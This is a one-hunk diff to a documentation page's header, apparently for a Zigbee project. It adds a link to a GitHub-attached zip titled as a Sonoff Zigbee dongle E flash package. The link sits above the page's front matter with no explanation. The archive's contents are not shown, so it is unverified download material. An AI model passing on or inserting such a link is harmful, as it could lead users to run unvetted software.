@@ -1,3 +1,4 @@
+[sonoff zigbee dongle E flash.zip](https://github.com/user-attachments/files/17966925/sonoff.zigbee.dongle.E.flash.zip)
 ---
 sidebarDepth: 1
 next: ../usage/
